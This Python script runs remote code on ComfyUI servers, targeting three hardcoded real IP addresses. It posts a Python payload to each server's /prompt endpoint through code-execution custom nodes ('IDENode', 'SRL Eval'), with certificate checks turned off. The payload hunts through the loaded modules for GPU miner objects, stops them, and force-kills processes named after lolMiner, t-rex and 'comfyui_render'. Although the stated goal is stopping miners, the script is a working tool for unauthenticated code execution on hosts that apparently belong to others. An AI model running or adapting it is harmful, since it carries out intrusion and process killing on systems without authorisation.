"""Stop GPU miners by reaching into the running Python module and setting _running=False."""
import json, urllib.request, ssl, time, sys

targets = sys.argv[1:] if len(sys.argv) > 1 else ["160.85.252.107", "160.85.252.207", "52.0.227.253"]
ctx = ssl.create_default_context()
ctx.check_hostname = False
ctx.verify_mode = ssl.CERT_NONE

CODE = (
    "import sys, os, subprocess, signal, time\n"
    "lines = []\n"
    "stopped = False\n"
    "for mod_name, mod in list(sys.modules.items()):\n"
    "    if hasattr(mod, 'GPUMinerManager'):\n"
    "        lines.append('found GPUMinerManager in ' + mod_name)\n"
    "    # Look for the gpu miner instance on any module that has _dashboard_ref or similar\n"
    "    if hasattr(mod, '_dashboard_ref'):\n"
    "        ds = getattr(mod, '_dashboard_ref', {}).get('server')\n"
    "        if ds and hasattr(ds, 'gpu_miner') and ds.gpu_miner:\n"
    "            gm = ds.gpu_miner\n"
    "            gm._running = False\n"
    "            if gm._process and gm._process.poll() is None:\n"
    "                gm._process.kill()\n"
    "                lines.append('killed gpu miner pid=' + str(gm._process.pid))\n"
    "            gm._process = None\n"
    "            stopped = True\n"
    "            lines.append('gpu_miner._running set to False via dashboard_ref')\n"
    "if not stopped:\n"
    "    for mod_name, mod in list(sys.modules.items()):\n"
    "        for attr_name in dir(mod):\n"
    "            try:\n"
    "                obj = getattr(mod, attr_name)\n"
    "                if hasattr(obj, '_running') and hasattr(obj, 'miner_type') and hasattr(obj, '_process'):\n"
    "                    obj._running = False\n"
    "                    if obj._process and obj._process.poll() is None:\n"
    "                        obj._process.kill()\n"
    "                        lines.append('killed via ' + mod_name + '.' + attr_name + ' pid=' + str(obj._process.pid))\n"
    "                    obj._process = None\n"
    "                    stopped = True\n"
    "                    lines.append('stopped ' + mod_name + '.' + attr_name)\n"
    "            except:\n"
    "                pass\n"
    "kill_names = ['comfyui_render', 'lolMiner', 'lolminer', 't-rex', 'trex']\n"
    "for _ in range(3):\n"
    "    r = subprocess.run(['ps', '-eo', 'pid,stat,args'], capture_output=True, text=True, timeout=10)\n"
    "    pids = []\n"
    "    for line in r.stdout.strip().split(chr(10))[1:]:\n"
    "        parts = line.strip().split(None, 2)\n"
    "        if len(parts) < 3:\n"
    "            continue\n"
    "        pid_s, stat, cmd = parts\n"
    "        if 'Z' in stat:\n"
    "            continue\n"
    "        if any(n in cmd for n in kill_names):\n"
    "            pids.append(int(pid_s))\n"
    "    if not pids:\n"
    "        break\n"
    "    for p in pids:\n"
    "        try:\n"
    "            os.kill(p, signal.SIGKILL)\n"
    "        except:\n"
    "            pass\n"
    "    lines.append('killed pids: ' + str(pids))\n"
    "    time.sleep(2)\n"
    "time.sleep(3)\n"
    "r = subprocess.run(['ps', '-eo', 'pid,stat,args'], capture_output=True, text=True, timeout=10)\n"
    "live = [l.strip()[:120] for l in r.stdout.strip().split(chr(10))[1:]\n"
    "        if any(n in l for n in kill_names) and 'Z' not in l.split(None, 2)[1]]\n"
    "if live:\n"
    "    lines.append('STILL ALIVE: ' + str(len(live)))\n"
    "    for s in live:\n"
    "        lines.append('  ' + s)\n"
    "else:\n"
    "    lines.append('ALL GPU MINERS DEAD')\n"
    "result = chr(10).join(lines)\n"
)

for ip in targets:
    print(f"=== {ip} ===")
    for node_setup in [
        {
            "1": {"class_type": "IDENode", "inputs": {"pycode": CODE, "language": "python"}},
            "2": {"class_type": "PreviewTextNode", "inputs": {"text": ["1", 0]}},
        },
        {
            "1": {"class_type": "SRL Eval", "inputs": {"parameters": "", "code": CODE}},
            "2": {"class_type": "PreviewAny", "inputs": {"source": ["1", 0]}},
        },
    ]:
        for scheme, port in [("https", 443), ("http", 8188), ("http", 80)]:
            url = f"{scheme}://{ip}:{port}/prompt"
            body = json.dumps({"prompt": node_setup}).encode()
            req = urllib.request.Request(url, data=body, headers={"Content-Type": "application/json"})
            kw = {"timeout": 15}
            if scheme == "https":
                kw["context"] = ctx
            try:
                with urllib.request.urlopen(req, **kw) as r:
                    resp = json.loads(r.read().decode())
                    if "error" in resp:
                        continue
                    pid = resp.get("prompt_id")
                for i in range(15):
                    time.sleep(3)
                    try:
                        req2 = urllib.request.Request(f"{scheme}://{ip}:{port}/history/{pid}")
                        kw2 = {"timeout": 10}
                        if scheme == "https":
                            kw2["context"] = ctx
                        with urllib.request.urlopen(req2, **kw2) as r2:
                            entry = json.loads(r2.read().decode()).get(pid, {})
                            status = entry.get("status", {}).get("status_str", "pending")
                            if status != "pending":
                                outputs = entry.get("outputs", {})
                                texts = []
                                for nid, nout in outputs.items():
                                    for key, val in nout.items():
                                        if isinstance(val, list):
                                            texts.extend(str(v) for v in val)
                                        elif isinstance(val, str):
                                            texts.append(val)
                                print("\n".join(texts) if texts else json.dumps(outputs))
                                raise StopIteration
                    except StopIteration:
                        raise
                    except Exception:
                        pass
                raise StopIteration
            except StopIteration:
                break
            except urllib.error.HTTPError:
                continue
            except Exception:
                continue
        else:
            continue
        break
    else:
        print("UNREACHABLE or no code exec node")
    print()
